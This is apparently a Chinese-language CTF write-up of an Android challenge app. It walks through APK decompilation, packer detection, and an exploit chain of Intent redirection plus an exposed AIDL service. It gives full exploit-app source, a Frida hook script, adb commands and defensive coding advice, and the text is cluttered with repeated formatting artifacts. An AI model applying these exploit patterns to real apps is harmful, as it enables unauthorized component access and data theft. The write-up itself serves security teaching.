ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// 错误示例String className = intent.getStringExtra("target");Intent i = new Intent();i.setClassName(this, className); // 危险！// 正确示例String action = intent.getStringExtra("action");Intent i = null;switch(action) { case "SAFE_ACTION_1": i = new Intent(this, SafeActivity.class); break; default: throw new IllegalArgumentException();}

验证Intent来源：

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line@Overrideprotected void onCreate(Bundle savedInstanceState) { if(!isValidCaller()) { finish(); return; } // 正常处理}

敏感数据加密存储：

使用Android Keystore

密钥不要硬编码

AIDL接口最小化：

只暴露必要的方法

返回数据前验证调用者权限

网络传输加密：

使用HTTPS

实现证书锁定（Certificate Pinning）

使用商业加固：

爱加密、梆梆、娜迦等

调用者验证：

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linebool verify_caller(JNIEnv* env, jobject context) { j
class ctx_class = (*env)->GetObjectClass(env, context); jmethodID getPkg = (*env)->GetMethodID(env, ctx_class, "getPackageName", "()Ljava/lang/String;"); jstring pkgName = (*env)->CallObjectMethod(env, context, getPkg); const char* pkg = (*env)->GetStringUTFChars(env, pkgName, NULL); bool valid = strcmp(pkg, "com.example.trustedapp") == 0; (*env)->ReleaseStringUTFChars(env, pkgName, pkg); return valid;}

反调试机制：

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// 检测TracerPidbool is_debugged() { char buf[1024]; FILE* fp = fopen("/proc/self/status", "r"); while(fgets(buf, sizeof(buf), fp)) { if(strncmp(buf, "TracerPid:", 10) == 0) { int pid = atoi(buf + 10); fclose(fp); return pid != 0; } } fclose(fp); return false;}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line权限保护不当(normal级别) +AIDL接口暴露(CoreService) +Intent重定向漏洞(MiscService) +组件未导出但可间接调用(WebActivity) =完整攻击链

组件安全：

导出配置的重要性

权限保护级别的选择

组件间调用的验证

Intent安全：

Intent重定向漏洞的危害

序列化对象的传递

参数验证的必要性

IPC安全：

AIDL接口的安全风险

Binder调用者验证

跨进程数据传递

逆向技术：

APK反编译流程

SO加固识别

JNI调用分析

真实漏洞模拟：

Intent重定向在实际应用中广泛存在

normal权限保护也是常见的配置错误

多技术融合：

Java层逆向

Native层分析

网络协议理解

加密算法应用

攻防对抗：

SO加固 vs 运行时利用

调用者检测 vs AIDL绕过

组件保护 vs Intent重定向

Android安全机制：

SELinux for Android

应用沙箱机制

权限模型演进

逆向工程：

ARM汇编语言

IDA Pro高级用法

Frida脚本编写

漏洞挖掘：

Fuzzing技术

静态代码分析

动态污点追踪

加固与对抗：

VMP虚拟化保护

代码混淆技术

反调试高级技巧

Android开发者文档：https://developer.android.com

Android Security Overview：https://source.android.com/security

APKTool：https://ibotpeaches.github.io/Apktool/

JADX：https://github.com/skylot/jadx

Frida：https://frida.re

IDA Pro：https://www.hex-rays.com

OWASP Mobile Security Testing Guide

Android应用安全防护和渗透测试

Drozer：Android安全评估框架


```
ounter(lineounter(lineounter(lineunzip Load -d apk_extractedcd apk_extractedls -la
ounter(lineapktool d Load -o decompiled
ounter(lineounter(lineounter(line
ounter(line<activity android:
name=".WebActivity" />
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line<service android:
name=".CoreService" android:
permission="com.example.wawawa.permission.CORE_SERVICE">  <action android:
name="com.example.wawawa.CORE_SERVICE" /> </service>
ounter(lineounter(lineounter(lineounter(lineounter(line<service android:
name=".MiscService">  <action android:
name="com.example.wawawa.Misc_SERVICE" /> </service>
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepublic class WebActivity extends Activity { private WebView a; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(R.layout.activity_web); // 2130903068 this.a = findViewById(R.id.webview); this.a.setWebViewClient(new g(this)); Serializable v0 = this.getIntent().getSerializableExtra("KEY"); if(v0 == null || !(v0 instanceof b)) { Toast.makeText(this, "flag is null", Toast.LENGTH_SHORT).show(); } else { String v1 = ((b)v0).a(); // 获取key String v2 = ((b)v0).b(); // 获取iv if("loading".equals(((b)v0).c())) { if(v1 != null && v2 != null) { // 核心：调用Native方法解密flag URL this.a.loadUrl(Load.decode(this, v1, v2, a.a)); Toast.makeText(this, "flag loading ...", Toast.LENGTH_SHORT).show(); return; } this.a.loadUrl("file:///android_asset/666"); } } }}
Load.decode(Context context, String key, String iv, String encrypted)
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepublic class b implements Serializable { private String key; private String iv; private String status; public b(String key, String iv, String status) { this.key = key; this.iv = iv; this.status = status; } public String a() { return this.key; } public String b() { return this.iv; } public String c() { return this.status; }}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepublic class MiscService extends Service { @Override public int onStartCommand(Intent intent, int flags, int startId) { Intent nextIntent = this.a(intent); this.startActivity(nextIntent); return super.onStartCommand(intent, flags, startId); } public Intent a(Intent arg4) { Intent v0 = new Intent(); v0.setClassName( this.getApplicationContext(), arg4.getStringExtra("CLASS_NAME") ); v0.putExtras(arg4); v0.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // 268435456 return v0; }}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepublic class CoreService extends Service { private final b binder = new b(this); @Override public IBinder onBind(Intent intent) { return binder; } // 内部Binder实现 class b extends a.Stub { private CoreService a; b(CoreService service) { this.a = service; super(); } @Override public String a() throws RemoteException { c v0 = new c( Load.getUrl(this.a), // 获取VPS URL Load.getToken(this.a) // 获取Token ); v0.start(); try { v0.join(); } catch(InterruptedException e) { e.printStackTrace(); } return v0.a(); // 返回服务器响应（key） } @Override public String b() throws RemoteException { return null; } @Override public String c() throws RemoteException { return Load.getIv(this.a); // 直接返回IV } }}
Load.getUrl(Context) // 返回VPS的URLLoad.getToken(Context) // 返回验证TokenLoad.getIv(Context) // 返回DES的IV
class c extends Thread { private String url; private String token; private String response; c(String url, String token) { this.url = url; this.token = token; } @Override public void run() { // POST请求到url，携带token参数 // 服务器验证token后返回DES的key this.response = httpPost(url, token); } public String a() { return this.response; }}

ounter(linefile libWaWaWa.so
ounter(lineounter(linelibWaWaWa.so: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV),dynamically linked, no section header
ounter(linereadelf -d libWaWaWa.so
ounter(lineounter(linereadelf: Warning: Virtual address 0x460cc not located in any PT_LOAD segment.readelf: Error: Corrupt DT_STRTAB dynamic entry
begin decode strtabdecode string %send decode strtab 2
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// Java层调用：Load.decode(Context, String, String, String)JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_decode( JNIEnv* env, j
class clazz, jobject context, jstring key, jstring iv, jstring encrypted);// Java层调用：Load.getUrl(Context)JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_getUrl( JNIEnv* env, j
class clazz, jobject context);// Java层调用：Load.getToken(Context)JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_getToken( JNIEnv* env, j
class clazz, jobject context);// Java层调用：Load.getIv(Context)JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_getIv( JNIEnv* env, j
class clazz, jobject context);
// 检查调用者的包名是否合法j
class contextClass = (*env)->GetObjectClass(env, context);jmethodID getPackageNameMethod = (*env)->GetMethodID(env, contextClass, "getPackageName", "()Ljava/lang/String;");jstring packageName = (*env)->CallObjectMethod(env, context, getPackageNameMethod);
const char* pkgName = (*env)->GetStringUTFChars(env, packageName, NULL);if(strcmp(pkgName, "com.example.wawawa") != 0) { // 非法调用者，返回错误或崩溃 return NULL;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line第三方Exploit APK | | 1. 绑定CoreService（申请CORE_SERVICE权限） vCoreService.a() ----------> Load.getUrl() + Load.getToken() | | | 返回key | POST请求到VPS v v保存key值 VPS验证token，返回DES key | | 2. 调用CoreService.c() vCoreService.c() -----------> Load.getIv() | | | 返回iv | 从本地返回IV v v保存iv值 返回IV字符串 | | 3. 构造Intent，启动MiscService vMiscService.onStartCommand() | | 读取CLASS_NAME参数 = "com.example.wawawa.WebActivity" | 读取KEY参数 = 序列化的b对象(key, iv, "loading") v启动WebActivity（绕过未导出限制） | vWebActivity.onCreate() | | 反序列化b对象，提取key和iv vLoad.decode(context, key, iv, encryptedUrl) | | DES解密 vloadUrl(flagUrl) --------> VPS上的flag页面 | v获取FLAG
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line<?xml version="1.0" encoding="utf-8"?><manifest xmlns:
android="http://schemas.android.com/apk/res/android" package="com.exploit.loadctf"> <!-- 申请访问CoreService的权限 -->  <application android:
allowBackup="true" android:
label="Exploit" android:
theme="@style/AppTheme"> <activity android:
name=".MainActivity">  <action android:
name="android.intent.action.MAIN" /> <category android:
name="android.intent.category.LAUNCHER" />  </activity> </application></manifest>
ounter(linesrc/main/aidl/com/example/wawawa/d.aidl
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackage com.example.wawawa;interface d { String a(); // 获取key String b(); // 未使用 String c(); // 获取iv}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackage com.exploit.loadctf;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.widget.Toast;
import com.example.wawawa.d;public class MainActivity extends Activity { private static final String TAG = "LoadExploit"; private d coreService; private String key = null; private String iv = null; private ServiceConnection conn = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { Log.d(TAG, "CoreService connected"); coreService = d.Stub.asInterface(service); try { // 调用AIDL接口获取IV iv = coreService.c(); Log.d(TAG, "IV = " + iv); // 调用AIDL接口获取Key（会发起网络请求） key = coreService.a(); Log.d(TAG, "Key = " + key); // 成功获取key和iv后，启动攻击链第二阶段 if(key != null && iv != null) { launchWebActivity(); } } catch (RemoteException e) { e.printStackTrace(); Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show(); } } @Override public void onServiceDisconnected(ComponentName name) { Log.d(TAG, "CoreService disconnected"); coreService = null; } }; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); // 绑定目标应用的CoreService bindCoreService(); } private void bindCoreService() { try { ComponentName component = new ComponentName( "com.example.wawawa", "com.example.wawawa.CoreService" ); Intent intent = new Intent(); intent.setComponent(component); boolean result = bindService( intent, conn, Context.BIND_AUTO_CREATE ); if(result) { Log.d(TAG, "Binding CoreService..."); } else { Toast.makeText(this, "Failed to bind CoreService", Toast.LENGTH_LONG).show(); } } catch (Exception e) { e.printStackTrace(); } } private void launchWebActivity() { // 创建序列化对象 b data = new b(key, iv, "loading"); // 构造Intent，通过MiscService启动WebActivity Intent intent = new Intent("com.example.wawawa.Misc_SERVICE"); intent.putExtra("CLASS_NAME", "com.example.wawawa.WebActivity"); intent.putExtra("KEY", data); startService(intent); Toast.makeText(this, "Launching WebActivity...", Toast.LENGTH_LONG).show(); } @Override protected void onDestroy() { super.onDestroy(); if(coreService != null) { unbindService(conn); } }}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackage com.exploit.loadctf;
import java.io.Serializable;public class b implements Serializable { private String key; private String iv; private String status; public b(String key, String iv, String status) { this.key = key; this.iv = iv; this.status = status; } public String a() { return this.key; } public String b() { return this.iv; } public String c() { return this.status; }}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackage com.exploit.loadctf;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import com.example.wawawa.d;public class MainActivity extends Activity { private static final String TAG = "LoadExploit"; private TextView tvStatus; private TextView tvKey; private TextView tvIv; private Button btnBind; private Button btnExploit; private d coreService; private String key = null; private String iv = null; private ServiceConnection conn = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { updateStatus("CoreService已连接"); coreService = d.Stub.asInterface(service); new Thread(new Runnable() { @Override public void run() { try { // 获取IV（本地，速度快） iv = coreService.c(); runOnUiThread(new Runnable() { @Override public void run() { tvIv.setText("IV: " + iv); } }); // 获取Key（网络请求，可能较慢） updateStatus("正在从VPS获取Key..."); key = coreService.a(); runOnUiThread(new Runnable() { @Override public void run() { tvKey.setText("Key: " + key); if(key != null && iv != null) { btnExploit.setEnabled(true); updateStatus("参数获取成功！可以发起攻击"); } else { updateStatus("参数获取失败"); } } }); } catch (RemoteException e) { e.printStackTrace(); runOnUiThread(new Runnable() { @Override public void run() { updateStatus("错误: " + e.getMessage()); } }); } } }).start(); } @Override public void onServiceDisconnected(ComponentName name) { updateStatus("CoreService已断开"); coreService = null; } }; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); tvStatus = findViewById(R.id.tv_status); tvKey = findViewById(R.id.tv_key); tvIv = findViewById(R.id.tv_iv); btnBind = findViewById(R.id.btn_bind); btnExploit = findViewById(R.id.btn_exploit); btnBind.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { bindCoreService(); } }); btnExploit.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { launchWebActivity(); } }); } private void bindCoreService() { try { ComponentName component = new ComponentName( "com.example.wawawa", "com.example.wawawa.CoreService" ); Intent intent = new Intent(); intent.setComponent(component); boolean result = bindService(intent, conn, Context.BIND_AUTO_CREATE); if(result) { updateStatus("正在绑定CoreService..."); btnBind.setEnabled(false); } else { updateStatus("绑定失败：目标应用未安装？"); } } catch (Exception e) { updateStatus("异常: " + e.getMessage()); e.printStackTrace(); } } private void launchWebActivity() { if(key == null || iv == null) { Toast.makeText(this, "参数不完整", Toast.LENGTH_SHORT).show(); return; } // 构造序列化对象 b data = new b(key, iv, "loading"); // 通过MiscService启动WebActivity Intent intent = new Intent("com.example.wawawa.Misc_SERVICE"); intent.putExtra("CLASS_NAME", "com.example.wawawa.WebActivity"); intent.putExtra("KEY", data); intent.setPackage("com.example.wawawa"); // 指定目标包名 startService(intent); updateStatus("已发送攻击请求，WebActivity应该已启动"); Toast.makeText(this, "请查看目标应用", Toast.LENGTH_LONG).show(); } private void updateStatus(final String msg) { runOnUiThread(new Runnable() { @Override public void run() { tvStatus.setText(msg); Log.d(TAG, msg); } }); } @Override protected void onDestroy() { super.onDestroy(); if(coreService != null) { unbindService(conn); } }}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line<?xml version="1.0" encoding="utf-8"?><LinearLayout xmlns:
android="http://schemas.android.com/apk/res/android" android:
layout_width="match_parent" android:
layout_height="match_parent" android:
orientation="vertical" android:
padding="16dp"> <TextView android:id="@+id/tv_status" android:
layout_width="match_parent" android:
layout_height="wrap_content" android:
text="状态：未开始" android:
textSize="16sp" android:
textColor="#000000" android:
padding="8dp"/> <TextView android:id="@+id/tv_key" android:
layout_width="match_parent" android:
layout_height="wrap_content" android:
text="Key: 未获取" android:
textSize="14sp" android:
padding="8dp"/> <TextView android:id="@+id/tv_iv" android:
layout_width="match_parent" android:
layout_height="wrap_content" android:
text="IV: 未获取" android:
textSize="14sp" android:
padding="8dp"/>  </LinearLayout>
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line<!-- 显式声明不导出 --><activity android:
name=".WebActivity" android:
exported="false" /><!-- 导出组件必须有充分理由，并加强验证 --><service android:
name=".PublicService" android:
exported="true" android:
permission="signature级别的权限" />
ounter(lineounter(lineounter(line
ounter(lineounter(lineounter(lineounter(lineounter(line// 从外部Intent获取目标组件名String className = intent.getStringExtra("target");Intent newIntent = new Intent();newIntent.setClassName(getPackageName(), className); // 危险！startActivity(newIntent);
ounter(lineounter(lineounter(lineounter(lineIntent attack = new Intent();attack.setComponent(new ComponentName("com.victim.app", "VulnerableService"));attack.putExtra("target", "PrivateActivity"); // 未导出的组件startService(attack);
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineprivate static final Set<String> ALLOWED_CLASSES = new HashSet<>(Arrays.asList( "com.example.app.PublicActivity", "com.example.app.AnotherPublicActivity"));public Intent buildIntent(Intent input) { String className = input.getStringExtra("CLASS_NAME"); if(!ALLOWED_CLASSES.contains(className)) { throw new SecurityException("Invalid target class"); } Intent intent = new Intent(); intent.setClassName(this, className); return intent;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// 不要从外部Intent获取目标组件// 而是通过action或其他安全方式映射public Intent buildIntent(Intent input) { String action = input.getStringExtra("action"); Intent intent = new Intent(); switch(action) { case "ACTION_SHOW_SETTINGS": intent.setClass(this, SettingsActivity.class); break; case "ACTION_SHOW_HELP": intent.setClass(this, HelpActivity.class); break; default: throw new IllegalArgumentException("Unknown action"); } return intent;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line调用方进程 被调用方进程 | | | 1. 调用Proxy方法 | |------------------------------>| | | 2. Binder驱动传递 | | 序列化数据 | | | 3. Stub接收并反序列化 | |<------------------------------| | | 4. 调用实际方法 | | 5. 序列化返回值 |------------------------------>| | 6. 返回结果 |
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line@Overridepublic String getSensitiveData() throws RemoteException { // 获取调用者UID int callingUid = Binder.getCallingUid(); // 获取调用者包名 String[] packages = getPackageManager().getPackagesForUid(callingUid); if(packages == null || packages.length == 0) { throw new SecurityException("Unknown caller"); } // 白名单验证 boolean authorized = false; for(String pkg : packages) { if("com.trusted.app".equals(pkg)) { authorized = true; break; } } if(!authorized) { throw new SecurityException("Unauthorized caller: " + packages[0]); } // 验证签名 if(!verifySignature(packages[0])) { throw new SecurityException("Invalid signature"); } return sensitiveData;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line@Overridepublic String getSensitiveData() throws RemoteException { // 检查调用者是否有特定权限 if(checkCallingPermission("com.example.SENSITIVE_PERMISSION") != PackageManager.PERMISSION_GRANTED) { throw new SecurityException("Permission denied"); } return sensitiveData;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// Native层实现（推测）JNIEXPORT jstring JNICALLJava_com_example_wawawa_Load_decode( JNIEnv* env, j
class clazz, jobject context, jstring jKey, jstring jIv, jstring jEncrypted) { const char* key = (*env)->GetStringUTFChars(env, jKey, NULL); const char* iv = (*env)->GetStringUTFChars(env, jIv, NULL); const char* encrypted = (*env)->GetStringUTFChars(env, jEncrypted, NULL); // DES解密 unsigned char* decrypted = des_decrypt( (unsigned char*)encrypted, strlen(encrypted), (unsigned char*)key, (unsigned char*)iv ); jstring result = (*env)->NewStringUTF(env, (char*)decrypted); // 释放资源 (*env)->ReleaseStringUTFChars(env, jKey, key); (*env)->ReleaseStringUTFChars(env, jIv, iv); (*env)->ReleaseStringUTFChars(env, jEncrypted, encrypted); free(decrypted); return result;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 检测1：Section Headerreadelf -S libWaWaWa.so
# 如果输出"no sections"，说明被加固
# 检测2：字符串表readelf -p .dynstr libWaWaWa.so
# 如果报错"Corrupt DT_STRTAB"，说明字符串表被加密
# 检测3：导出符号nm -D libWaWaWa.so
# 如果无法列出函数名，说明符号表被处理
# 检测4：字符串strings libWaWaWa.so | grep "decode"# 如果看到"begin decode strtab"等字样，确认是娜迦加固
ounter(lineounter(lineadb install Loadadb shell pm list packages | grep wawawa
ounter(lineounter(lineounter(linecd ExploitProject./gradlew assembleDebugadb install app/build/outputs/apk/debug/app-debug.apk
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# 过滤目标应用的日志adb logcat | grep -E "(wawawa|LoadExploit)"# 监控Service绑定adb logcat | grep -i "bind"# 监控网络请求adb logcat | grep -E "(http|url)"
ounter(lineounter(lineounter(line
# 使用Charles或Burp Suite抓包
# 查看CoreService.a()发送的POST请求
# 分析token和返回的key
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// hook Native方法Java.perform(function() { var Load = Java.use("com.example.wawawa.Load"); Load.decode.implementation = function(context, key, iv, encrypted) { console.log("[*] decode called"); console.log(" Key: " + key); console.log(" IV: " + iv); console.log(" Encrypted: " + encrypted); var result = this.decode(context, key, iv, encrypted); console.log(" Decrypted: " + result); return result; }; Load.getUrl.implementation = function(context) { var url = this.getUrl(context); console.log("[*] getUrl: " + url); return url; }; Load.getToken.implementation = function(context) { var token = this.getToken(context); console.log("[*] getToken: " + token); return token; }; Load.getIv.implementation = function(context) { var iv = this.getIv(context); console.log("[*] getIv: " + iv); return iv; };});
ounter(lineounter(lineounter(line
ounter(lineounter(lineounter(lineint callingUid = Binder.getCallingUid();String[] packages = getPackageManager().getPackagesForUid(callingUid);// 验证包名和签名
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// 错误示例String className = intent.getStringExtra("target");Intent i = new Intent();i.setClassName(this, className); // 危险！// 正确示例String action = intent.getStringExtra("action");Intent i = null;switch(action) { case "SAFE_ACTION_1": i = new Intent(this, SafeActivity.class); break; default: throw new IllegalArgumentException();}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line@Overrideprotected void onCreate(Bundle savedInstanceState) { if(!isValidCaller()) { finish(); return; } // 正常处理}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linebool verify_caller(JNIEnv* env, jobject context) { j
class ctx_class = (*env)->GetObjectClass(env, context); jmethodID getPkg = (*env)->GetMethodID(env, ctx_class, "getPackageName", "()Ljava/lang/String;"); jstring pkgName = (*env)->CallObjectMethod(env, context, getPkg); const char* pkg = (*env)->GetStringUTFChars(env, pkgName, NULL); bool valid = strcmp(pkg, "com.example.trustedapp") == 0; (*env)->ReleaseStringUTFChars(env, pkgName, pkg); return valid;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line// 检测TracerPidbool is_debugged() { char buf[1024]; FILE* fp = fopen("/proc/self/status", "r"); while(fgets(buf, sizeof(buf), fp)) { if(strncmp(buf, "TracerPid:", 10) == 0) { int pid = atoi(buf + 10); fclose(fp); return pid != 0; } } fclose(fp); return false;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line权限保护不当(normal级别) +AIDL接口暴露(CoreService) +Intent重定向漏洞(MiscService) +组件未导出但可间接调用(WebActivity) =完整攻击链
```
